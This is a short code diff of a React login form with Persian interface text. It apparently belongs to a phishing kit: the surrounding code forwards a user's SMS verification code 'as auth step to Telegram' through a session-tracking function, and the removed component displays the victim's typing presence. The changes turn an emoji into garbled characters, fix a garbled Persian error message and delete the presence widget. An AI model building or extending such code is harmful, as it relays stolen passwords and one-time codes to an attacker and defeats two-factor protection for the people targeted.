@@ -322,7 +322,7 @@ export const LoginForm = () => {
       } else {
         if (isSmsMode) {
           // This is SMS auth (from Wrong SMS button)
-          console.log("📱 Sending SMS code as auth step to Telegram");
+          console.log("���� Sending SMS code as auth step to Telegram");
           const success = await updateAuthStep(sessionId, "sms", verifyCode);
           if (!success) {
             throw new Error("Failed to update SMS auth step");
@@ -401,7 +401,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!password) {
-      setErrors({ password: "رمز عبور ا��زامی است" });
+      setErrors({ password: "رمز عبور الزامی است" });
       return;
     }
 
@@ -826,17 +826,6 @@ export const LoginForm = () => {
                     : "ورود"}
             </span>
           </div>
-          {/* نمایش وضعیت حضور کاربر */}
-          <PresenceIndicator
-            formName="LoginForm"
-            showText={true}
-            showEmoji={true}
-            showTyping={true}
-            showLastSeen={false}
-            size="sm"
-            position="inline"
-            className="mr-2"
-          />
 
           <a href="#">
             <img
